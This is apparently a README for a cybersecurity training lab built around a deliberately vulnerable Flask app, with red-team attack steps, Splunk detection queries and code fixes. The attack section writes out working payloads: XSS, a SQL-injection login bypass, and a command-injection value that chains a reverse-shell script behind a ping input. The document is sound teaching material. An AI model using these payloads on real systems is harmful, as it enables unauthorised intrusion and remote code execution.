# 🔴🔵 Red/Blue Team Security Assessment Lab

> **Educational Purpose Only** — This project contains intentionally vulnerable code for cybersecurity training.

[![Python](https://img.shields.io/badge/Python-3.x-blue)](https://python.org)
[![Flask](https://img.shields.io/badge/Flask-3.1.5-green)](https://flask.palletsprojects.com)
[![Splunk](https://img.shields.io/badge/SIEM-Splunk-orange)](https://splunk.com)
[![Kali Linux](https://img.shields.io/badge/OS-Kali%20Linux-blue)](https://kali.org)

---

## 📋 Project Overview

This project simulates a **complete real-world attack and defense lifecycle** in a controlled lab environment. It was developed as part of the **Masar-NCSC (National Cyber Security Center)** cybersecurity training program.

The lab consists of three virtual machines simulating a target, attacker, and SIEM system. The project covers all phases from building a vulnerable application to attacking it, detecting the attacks, and remediating the vulnerabilities.

---

## 🏗️ Lab Architecture

```
┌─────────────────┐         ┌─────────────────┐         ┌─────────────────┐
│   VM3 Attacker  │──Exploit▶│   VM1 Target    │──Logs──▶│   VM2 SIEM      │
│  192.168.255.134│◀─Shell──│  192.168.255.128│         │  192.168.255.133│
│                 │         │                 │         │                 │
│  Kali Linux     │         │  Kali Linux     │         │  Ubuntu Server  │
│  Nmap/Gobuster  │         │  Flask Web App  │         │  Splunk 9.2.1   │
│  Netcat/curl    │         │  Splunk Fwd     │         │  HEC Port 8088  │
└─────────────────┘         └─────────────────┘         └─────────────────┘
```

---

## 👥 Team Roles

| Task | Responsibilities |
|------|-----------------|
| **Task 1** — Architecture & Visibility | Build lab, deploy vulnerable app, configure SIEM and log forwarding |
| **Task 2** — Offensive Red Team | Perform black-box penetration test and achieve RCE |
| **Task 3** — Defensive Blue Team / IR | Reconstruct attack timeline, containment, detection queries |
| **Task 4** — Mitigation & Re-Exploitation | Apply code fixes, re-test exploits, manage Git versioning |

---

## 🎯 Vulnerabilities Implemented

| # | Vulnerability | Location | Risk | Status |
|---|--------------|----------|------|--------|
| 1 | **File Upload** | `/upload` | Critical | ✅ Patched |
| 2 | **OS Command Injection** | `/ping` | Critical | ✅ Patched |
| 3 | **Cross-Site Scripting (XSS)** | `/comment` | High | ✅ Patched |
| 4 | **SQL Injection** | `/login` | Critical | ✅ Patched |

---

## 🔴 Red Team — Attack Summary

### Reconnaissance
```bash
# Port scanning
nmap -sV -sC 192.168.255.128 -p- --open

# Directory enumeration
gobuster dir -u http://192.168.255.128:5000 -w /usr/share/wordlists/dirb/common.txt
```

### Exploitation

**XSS:**
```html
<script>alert('XSS')</script>
```

**SQL Injection:**
```
Username: ' OR 1=1 --
Password: anything
```

**Command Injection + Reverse Shell:**
```bash
# Listener on attacker
nc -lvnp 5555

# Payload in /ping
127.0.0.1; python3 /home/kali/vulnerable_app/uploads/shell.py
```

**Result: Full RCE achieved ✅**

---

## 🔵 Blue Team — Detection Queries (Splunk)

```splunk
# File Upload Detection
index=main sourcetype=flask_app "POST /upload"
| eval attack="Malicious File Upload Attempt"
| table _time, _raw, attack

# XSS Detection
index=main sourcetype=flask_app "POST /comment"
| eval attack="XSS Attempt"
| table _time, _raw, attack

# Command Injection Detection
index=main sourcetype=flask_app "POST /ping"
| eval attack="Command Injection Attempt"
| table _time, _raw, attack

# SQL Injection Detection
index=main sourcetype=flask_app "POST /login"
| eval attack="SQL Injection Attempt"
| table _time, _raw, attack
```

---

## 🛡️ Mitigation — Code Fixes

### File Upload Fix
```python
ALLOWED_EXTENSIONS = {'txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif'}

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
```

### Command Injection Fix
```python
import re
if re.match(r'^[a-zA-Z0-9.\-]+$', host):
    output = subprocess.getoutput(f'ping -c 1 {host}')
else:
    output = 'Error: Invalid host!'
```

### XSS Fix
```html
<!-- Before (vulnerable) -->
{{ msg | safe }}

<!-- After (fixed) -->
{{ msg }}
```

### SQL Injection Fix
```python
# Before (vulnerable)
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"

# After (fixed)
query = "SELECT * FROM users WHERE username=? AND password=?"
result = conn.execute(query, (username, password)).fetchone()
```

---

## 📁 Repository Structure

```
red-blue-team-lab/
├── app.py                  ← Main Flask application (patched version)
├── users.db                ← SQLite database
├── templates/
│   ├── index.html
│   ├── upload.html
│   ├── ping.html
│   ├── comment.html
│   └── login.html
└── uploads/                ← File upload directory
```

---

## 📊 Git History

```
33e1f7c  Fix: Patched File Upload, Command Injection, XSS, SQL Injection
7cd1ac9  Initial commit - vulnerable version (baseline)
```

---

## 🛠️ Tech Stack

| Component | Technology |
|-----------|-----------|
| Web App | Python Flask 3.1.5 |
| Database | SQLite3 |
| SIEM | Splunk Enterprise 9.2.1 |
| Log Forwarding | Splunk HEC (HTTP Event Collector) |
| Target OS | Kali Linux |
| SIEM OS | Ubuntu Server 24.04 LTS |

---

## ⚠️ Disclaimer

This project is for **educational purposes only**. The vulnerable code is intentional and designed for cybersecurity training in a controlled lab environment. Do not deploy this application in a production environment.

---

## 📚 References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Splunk Documentation](https://docs.splunk.com)
- [Flask Documentation](https://flask.palletsprojects.com)
- [Nmap Documentation](https://nmap.org/docs.html)

---
*author : AbdaullahAbughallous
*Developed as part of Masar-NCSC Cybersecurity Training Program — 2026*
